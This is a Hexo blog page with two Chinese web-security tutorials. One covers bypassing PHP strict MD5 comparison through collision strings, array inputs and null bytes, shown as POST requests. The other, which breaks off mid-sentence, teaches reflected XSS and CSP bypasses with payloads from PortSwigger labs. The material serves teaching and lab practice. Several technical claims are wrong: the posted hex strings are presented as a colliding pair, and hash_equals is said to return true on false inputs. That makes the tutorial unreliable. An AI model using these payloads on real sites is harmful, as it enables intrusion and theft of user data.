<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/10/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-Web/PHP比较漏洞/强比较" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%BA%E6%AF%94%E8%BE%83/" class="article-date">
  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%BA%E6%AF%94%E8%BE%83/">PHP强比较漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="强比较"><a href="#强比较" class="headerlink" title="强比较"></a>强比较</h1><h2 id="1-MD5-碰撞（Collision-Attack）"><a href="#1-MD5-碰撞（Collision-Attack）" class="headerlink" title="1. MD5 碰撞（Collision Attack）"></a><strong>1. MD5 碰撞（Collision Attack）</strong></h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>MD5 算法存在碰撞漏洞，即两个不同的输入可以生成相同的 MD5 哈希值。<br><strong>适用于</strong> <code>md5($a) === md5($b)</code>​ 且 <code>$a !== $b</code>​ 的情况。</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a><strong>示例</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;240610708&quot;</span>;  <span class="comment">// md5: 0e462097431906509019562988736854</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;QNKCDZO&quot;</span>;    <span class="comment">// md5: 0e830400451993494058024219903391</span></span><br></pre></td></tr></table></figure>

<p>虽然这两个字符串的 MD5 都以 <code>0e</code>​ 开头，但严格比较（<code>===</code>​）仍然会检查整个字符串，因此 <strong>需要找到真正的 MD5 碰撞</strong>。</p>
<h3 id="已知-MD5-碰撞对"><a href="#已知-MD5-碰撞对" class="headerlink" title="已知 MD5 碰撞对"></a><strong>已知 MD5 碰撞对</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$collision1</span> = <span class="string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&quot;</span>;</span><br><span class="line"><span class="variable">$collision2</span> = <span class="string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这两个字符串的 MD5 完全相同：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$collision1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$collision2</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p><strong>攻击方式</strong>：</p>
<ul>
<li><p>构造 <code>POST</code>​ 请求，提交这两个字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /target.php HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">wqh=4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&amp;dsy=4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2</span><br></pre></td></tr></table></figure></li>
<li><p>这样 <code>md5($wqh) === md5($dsy)</code>​ 成立，且 <code>$wqh !== $dsy</code>​。</p>
</li>
</ul>
<hr>
<h2 id="2-数组绕过（Array-Bypass）"><a href="#2-数组绕过（Array-Bypass）" class="headerlink" title="2. 数组绕过（Array Bypass）"></a><strong>2. 数组绕过（Array Bypass）</strong></h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>PHP 的 <code>md5()</code>​ 函数在接收数组时会返回 <code>false</code>​，因此如果 <code>$wqh</code>​ 和 <code>$dsy</code>​ 都是数组，则：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$wqh</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$dsy</span>); <span class="comment">// false === false → true</span></span><br></pre></td></tr></table></figure>

<p>但代码中通常会有 <code>$wqh !== $dsy</code>​ 检查，因此需要构造两个不同的数组。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a><strong>示例</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$wqh</span> = [<span class="string">&quot;a&quot;</span> =&gt; <span class="number">1</span>];</span><br><span class="line"><span class="variable">$dsy</span> = [<span class="string">&quot;b&quot;</span> =&gt; <span class="number">2</span>];</span><br></pre></td></tr></table></figure>

<ul>
<li>​<code>md5($wqh)</code>​ 和 <code>md5($dsy)</code>​ 都返回 <code>false</code>​。</li>
<li>​<code>$wqh !== $dsy</code>​ 成立（因为数组不同）。</li>
</ul>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a><strong>攻击方式</strong></h3><p>提交数组：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /target.php HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">wqh[]=1&amp;dsy[]=2</span><br></pre></td></tr></table></figure>

<ul>
<li>​<code>$_POST[&#39;wqh&#39;]</code>​ 和 <code>$_POST[&#39;dsy&#39;]</code>​ 是不同的数组。</li>
<li>​<code>md5($_POST[&#39;wqh&#39;]) === md5($_POST[&#39;dsy&#39;])</code>​ 成立（都是 <code>false</code>​）。</li>
<li>​<code>$_POST[&#39;wqh&#39;] !== $_POST[&#39;dsy&#39;]</code>​ 成立。</li>
</ul>
<hr>
<h2 id="3-特殊字符串绕过（Magic-Hashes）"><a href="#3-特殊字符串绕过（Magic-Hashes）" class="headerlink" title="3. 特殊字符串绕过（Magic Hashes）"></a><strong>3. 特殊字符串绕过（Magic Hashes）</strong></h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>某些字符串的 MD5 哈希值以 <code>0e</code>​ 开头（科学计数法），在 **松散比较（**​ <strong>​<code>==</code>​</strong> ​ <strong>）</strong>  时会被视为 <code>0</code>​，但在 **严格比较（**​ <strong>​<code>===</code>​</strong> ​ <strong>）</strong>  时仍然需要完全匹配。</p>
<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a><strong>示例</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s878926199a&quot;</span>; <span class="comment">// md5: 0e545993274517709034328855841020</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;s155964671a&quot;</span>; <span class="comment">// md5: 0e342768416822451524974117254469</span></span><br></pre></td></tr></table></figure>

<p>虽然它们的 MD5 都以 <code>0e</code>​ 开头，但严格比较时不会匹配。</p>
<h3 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a><strong>适用情况</strong></h3><p>如果代码错误地使用了 <code>==</code>​ 而不是 <code>===</code>​，可以使用这些字符串绕过：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<p>但在严格比较（<code>===</code>​）下无效。</p>
<hr>
<h2 id="4-NULL-字节注入（Null-Byte-Injection）"><a href="#4-NULL-字节注入（Null-Byte-Injection）" class="headerlink" title="4. NULL 字节注入（Null Byte Injection）"></a><strong>4. NULL 字节注入（Null Byte Injection）</strong></h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>如果代码在计算 MD5 之前对输入进行了字符串处理（如 <code>trim()</code>​、<code>substr()</code>​），可能会因 NULL 字节（<code>%00</code>​）导致哈希值相同。</p>
<h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a><strong>示例</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;abc\00&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;abc&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>如果代码在计算 MD5 之前去掉了 NULL 字节，则：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$a</span>)) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a><strong>攻击方式</strong></h3><p>提交：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /target.php HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">wqh=abc%00&amp;dsy=abc</span><br></pre></td></tr></table></figure>

<p>如果服务器端代码对输入进行了 <code>trim()</code>​ 或类似处理，可能绕过。</p>
<hr>
<h2 id="5-利用-​hash-equals​​-的缺陷"><a href="#5-利用-​hash-equals​​-的缺陷" class="headerlink" title="5. 利用 ​hash_equals​​ 的缺陷"></a><strong>5. 利用</strong> <strong>​<code>hash_equals</code>​</strong>​ <strong>的缺陷</strong></h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>如果代码使用 <code>hash_equals(md5($a), md5($b))</code>​，仍然可能被数组绕过：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">hash_equals</span>(<span class="title function_ invoke__">md5</span>([]), <span class="title function_ invoke__">md5</span>([])); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h3 id="攻击方式-2"><a href="#攻击方式-2" class="headerlink" title="攻击方式"></a><strong>攻击方式</strong></h3><p>提交数组：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /target.php HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">wqh[]=1&amp;dsy[]=2</span><br></pre></td></tr></table></figure>

<ul>
<li>​<code>md5($wqh)</code>​ 和 <code>md5($dsy)</code>​ 都是 <code>false</code>​。</li>
<li>​<code>hash_equals(false, false)</code>​ 返回 <code>true</code>​。</li>
</ul>
<hr>
<h2 id="6-利用-​-​-​-的严格比较特性"><a href="#6-利用-​-​-​-的严格比较特性" class="headerlink" title="6. 利用  ​===​ ​ 的严格比较特性"></a><strong>6. 利用</strong>  <strong>​<code>===</code>​</strong> ​ <strong>的严格比较特性</strong></h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>如果代码逻辑有误，比如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> !== <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<p>但 <code>md5($a)</code>​ 和 <code>md5($b)</code>​ 必须完全相同，因此 <strong>必须找到真正的 MD5 碰撞</strong>（如方法 1）。</p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><table>
<thead>
<tr>
<th>绕过方式</th>
<th>适用条件</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><strong>MD5 碰撞</strong></td>
<td>严格比较（<code>===</code>​）</td>
<td>​<code>4dc968ff...</code>​vs<code>4dc968ff...</code>​</td>
</tr>
<tr>
<td><strong>数组绕过</strong></td>
<td>​<code>md5([]) === false</code>​</td>
<td>​<code>wqh[]=1&amp;dsy[]=2</code>​</td>
</tr>
<tr>
<td><strong>Magic Hashes</strong></td>
<td>仅适用于<code>==</code>​</td>
<td>​<code>s878926199a</code>​vs<code>s155964671a</code>​</td>
</tr>
<tr>
<td><strong>NULL 字节注入</strong></td>
<td>输入被<code>trim()</code>​处理</td>
<td>​<code>abc%00</code>​vs<code>abc</code>​</td>
</tr>
<tr>
<td>**<code>hash_equals</code>​绕过**</td>
<td>使用<code>hash_equals</code>​</td>
<td>​<code>wqh[]=1&amp;dsy[]=2</code>​</td>
</tr>
</tbody></table>
<h3 id="最佳防御方式"><a href="#最佳防御方式" class="headerlink" title="最佳防御方式"></a><strong>最佳防御方式</strong></h3><ol>
<li><strong>避免使用 MD5</strong>，改用 <code>SHA-256</code>​ 或 <code>bcrypt</code>​。</li>
<li><strong>检查输入类型</strong>（<code>is_string()</code>​）。</li>
<li><strong>禁止数组输入</strong>（<code>is_array()</code>​ 检查）。</li>
<li><strong>使用</strong> <strong>​<code>hash_equals</code>​</strong>​ <strong>但确保输入是字符串</strong>。</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%BA%E6%AF%94%E8%BE%83/" data-id="cmawczpnx001mik7k64heam6x" data-title="PHP强比较漏洞" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web/XSS/从0到1完全掌握 XSS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/05/20/Web/XSS/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1%20XSS/" class="article-date">
  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/05/20/Web/XSS/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1%20XSS/">从0到1完全掌握XSS</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="从0到1完全掌握-XSS"><a href="#从0到1完全掌握-XSS" class="headerlink" title="从0到1完全掌握 XSS"></a>从0到1完全掌握 XSS</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本人二刷 XSS，在一刷的时候是以漏洞挖掘与漏洞利用为主，实际上完全对于实战根本没有概念，出去工作一段时间之后才算是拿出来应用。写这篇文章是打算再好好地梳理一遍 XSS。</p>
<blockquote>
<p>XSS 的本质是一种高级钓鱼手法。</p>
</blockquote>
<h2 id="0x02-什么是-XSS"><a href="#0x02-什么是-XSS" class="headerlink" title="0x02 什么是 XSS"></a>0x02 什么是 XSS</h2><p>XSS (Cross Site Scripting) 攻击全称<strong>跨站脚本攻击</strong>，是为不和<strong>层叠样式表</strong> (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS。<br>XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许<strong>恶意 Web 用户</strong>将代码植入到提供给<strong>其它用户使用的页面</strong>中。</p>
<ul>
<li>XSS 的运行原理是将恶意的 script 脚本插入进 html&#x2F;css&#x2F;js 文件当中。代码长这样。</li>
</ul>
<p><img src="/.com//image-20250519114353-hnupv1m.png" alt="image"></p>
<h2 id="0x03-XSS-的危害"><a href="#0x03-XSS-的危害" class="headerlink" title="0x03 XSS 的危害"></a>0x03 XSS 的危害</h2><p>前文我们说 XSS 本质上来说是一种钓鱼攻击，所以 XSS 的危害角度上也是以钓鱼能够造成的危害为主。</p>
<h2 id="0x04-XSS-简单应用场景举例"><a href="#0x04-XSS-简单应用场景举例" class="headerlink" title="0x04 XSS 简单应用场景举例"></a>0x04 XSS 简单应用场景举例</h2><p>这里我想先介绍 XSS 的应用方法，如此一来讲起来不会太空洞，也能与下面的攻击手段有所呼应。以反射型 XSS 为例，原理图如下。</p>
<p><img src="/.com//image-20250519114421-ekwxctq.png" alt="image">	​</p>
<ul>
<li>这里借用国光师傅的图片进行分析</li>
</ul>
<p><img src="/.com//image-20250519114457-xl4w7mw.png" alt="image"></p>
<p>这是一个恶意的 QQ 空间钓鱼网站，我们在输入框内输入username%20<script>alert(document.cookie)</script>，再对登陆的按钮设置一个 href 到真正的 QQ 空间官网。然而当时用户输入的用户名密码已经被攻击者窃取了。</p>
<hr>
<h2 id="XSS-基本攻击手段"><a href="#XSS-基本攻击手段" class="headerlink" title="XSS 基本攻击手段"></a>XSS 基本攻击手段</h2><ul>
<li>XSS 根据效果不同主要分为三种类型</li>
<li>反射型 XSS，存储型 XSS，DOM 型 XSS</li>
</ul>
<p>危害性来说，存储型 XSS &gt;&gt; 反射型 XSS ~= DOM 型 XSS<br>我们接下来细讲一下这三种 XSS 的攻击手段。</p>
<h3 id="1-反射型-XSS-及绕过手段"><a href="#1-反射型-XSS-及绕过手段" class="headerlink" title="1. 反射型 XSS 及绕过手段"></a>1. 反射型 XSS 及绕过手段</h3><h4 id="1-什么是反射型-XSS"><a href="#1-什么是反射型-XSS" class="headerlink" title="(1) 什么是反射型 XSS"></a>(1) 什么是反射型 XSS</h4><p>反射型 XSS，也叫非持久型 XSS，转瞬即逝。</p>
<p>利用比较简单，比如在搜索框中，我记得当时 2020 年，b 站的搜索框还是存在 XSS 的，现在没有了。</p>
<p>反射型 XSS 的 Payload 如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250519170804-2sjs41c.png" alt="image"></p>
<p>效果如图所示</p>
<p><img src="/.com//image-20250519170813-4tfx507.png" alt="image"></p>
<h5 id="一、当大多数标签被禁止时的绕过"><a href="#一、当大多数标签被禁止时的绕过" class="headerlink" title="一、当大多数标签被禁止时的绕过"></a>一、当大多数标签被禁止时的绕过</h5><blockquote>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked">Lab: Reflected XSS into HTML context with most tags and attributes blocked</a></p>
</blockquote>
<p>还是常规的 Fuzz 测试，在尝试 XSS 攻击之后，若失败了就进行 Fuzz 测试，因为无法排除是不是 WAF 过滤了部分关键字。</p>
<p>探测出来 onresize 标签还是有效的，我们可以通过这一串 Payload 唤起打印服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onresize=print()&gt;&quot; onload=this.style.width=&#x27;100px&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250519171044-j7g2u17.png" alt="image"></p>
<h5 id="二、当事件处理器与-href-被禁用时的绕过"><a href="#二、当事件处理器与-href-被禁用时的绕过" class="headerlink" title="二、当事件处理器与 href 被禁用时的绕过"></a>二、当事件处理器与 href 被禁用时的绕过</h5><ul>
<li>老样子还是需要 Fuzz 的。如果渗透测试真正遇到这种情况的话，<code>svg</code>​标签的绕过方式还是主流。</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked">Lab: Reflected XSS with event handlers and href attributes blocked</a></p>
</blockquote>
<p>Payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;</span><br><span class="line">	&lt;a&gt;</span><br><span class="line">	&lt;animate attributeName=href</span><br><span class="line">     values=javascript:alert(1) /&gt;</span><br><span class="line">		&lt;text x=20 y=20&gt;Click me&lt;/text&gt;</span><br><span class="line">    &lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>还有一些<code>svg</code>​标签的绕过手段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h5 id="三、对-script-进行闭合后构造-Payload"><a href="#三、对-script-进行闭合后构造-Payload" class="headerlink" title="三、对 script 进行闭合后构造 Payload"></a>三、对 script 进行闭合后构造 Payload</h5><p>对某些语句中的符号进行闭合。<br>有些 Web 后端代码会通过反斜杠转义，对很多单引号字符进行过滤，那么转义之后的代码就不能进行原 Payload 的作用。</p>
<ul>
<li>XSS Insert Into-&gt; JavaScript</li>
</ul>
<p>这种 Payload 可以是通过修改 Web 网站内部 JavaScript 来实现的，因为 JavaScript 本身就可以直接执行 alert 方法，无需使用<code>&lt;script&gt;</code>​标签。</p>
<p>一般的 Payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-alert(document.domain)-&#x27; </span><br><span class="line">&#x27;;alert(document.domain)//</span><br></pre></td></tr></table></figure>

<h5 id="四、绕过-CSP-攻击"><a href="#四、绕过-CSP-攻击" class="headerlink" title="四、绕过 CSP 攻击"></a>四、绕过 CSP 攻击</h5><ul>
<li>CSP：content security policy，比较严格的防御 XSS 手段。</li>
</ul>
<p>它一般在 HTTP 包里面长这样</p>
<p><img src="/.com//image-20250519171202-sovbupc.png" alt="image"></p>
<p>CSP通过这样的指令限制只能加载与页面本身相同来源的资源</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure>

<p>通过下面的指令限制只能从指定域中加载资源</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src https://scripts.normal-website.com</span><br></pre></td></tr></table></figure>

<p>但是这种允许外部域的做法还是有风险的，如果攻击者可以向其传递恶意脚本也会遭到攻击的。而且应该也同时不信任来自 CDN 的资源，因为也有被投放的风险。CSP 还通过随机数和哈希值来指定可信资源。</p>
<ul>
<li>CSP 的指令指定一个随机数，加载脚本的标签也必须有相同的随机数。否则就不执行该脚本。并秉持一次性的原则，避免被猜解。</li>
<li>CSP 指令可以指定脚本内容的哈希值。不匹配也是不会执行的。</li>
</ul>
<h6 id="绕过方式一-悬空标记攻击"><a href="#绕过方式一-悬空标记攻击" class="headerlink" title="绕过方式一 悬空标记攻击"></a>绕过方式一 悬空标记攻击</h6><ul>
<li>这种和闭合语句的攻击差不多。</li>
</ul>
<p>虽然 CSP 通常可以阻止脚本，但是经常不会禁止加载图片资源，这就导致可以利用<code>img</code>​标签窃取 CSRF 令牌。</p>
<p>有些浏览器比如 chrome，就有内置的悬空标记缓解功能，这个功能可以阻止包含某些字符的请求，比如换行符、未编码的新一行符或者尖括号。还有一些策略更为严格，可以防止所有形式的外部请求。</p>
<p>但是还是可以通过注入一个 HTML 元素，点击该元素就会将该元素包含的所有内容发送到外部服务器的方式绕过这种策略，这里感觉有点像点击劫持攻击。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack">Lab: Reflected XSS protected by very strict CSP, with dangling markup attack</a></p>
</blockquote>
<p>首先我们观察一下修改邮箱的表单要提交哪些信息</p>
<p><img src="/.com//image-20250519171227-fw71hjh.png" alt="image"></p>
<p>接着利用悬挂标记攻击将 CSRF Token 窃取出来，所以我们这样构造 Payload</p>
<p><img src="/.com//image-20250519171235-02jsgfn.png" alt="image"></p>
<p>再然后用 CSRF 盗用 token，再发包即可。</p>
<h6 id="绕过方式二-对-CSP-限制不严格的情况下攻击"><a href="#绕过方式二-对-CSP-限制不严格的情况下攻击" class="headerlink" title="绕过方式二 对 CSP 限制不严格的情况下攻击"></a>绕过方式二 对 CSP 限制不严格的情况下攻击</h6><ul>
<li>CSP 是有设置的，若<code>base-url</code>​为空的话，可以通过 token 值来添加新的 CSP 指令。</li>
</ul>
<p>Payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;&amp;token=;script-src-elem &#x27;unsafe-inline&#x27;</span><br></pre></td></tr></table></figure>

<p>我们使用<code>script-src-elem</code>​对 CSP 进行覆盖，从而进行 XSS 攻击。</p>
<hr>
<h3 id="2-存储型-XSS"><a href="#2-存储型-XSS" class="headerlink" title="2. 存储型 XSS"></a>2. 存储型 XSS</h3><p>存储型 XSS 是危害性最大的 XSS 了，它一般出现于评论留言功能处，大致的利用方法与绕过手段与反射型 XSS 很像，原理图如下。</p>
<p><img src="/.com//image-20250519114421-ekwxctq.png" alt="image"></p>
<ul>
<li>如果执行起来也是插入进上下文标签当中，和之前反射型 XSS 的代码图类似，都是没有加任何的过滤手段，如图。</li>
</ul>
<p><img src="/.com//image-20250519171316-dariuk1.png" alt="image"></p>
<p>我们在新增的评论中将 username 构造成 Payload</p>
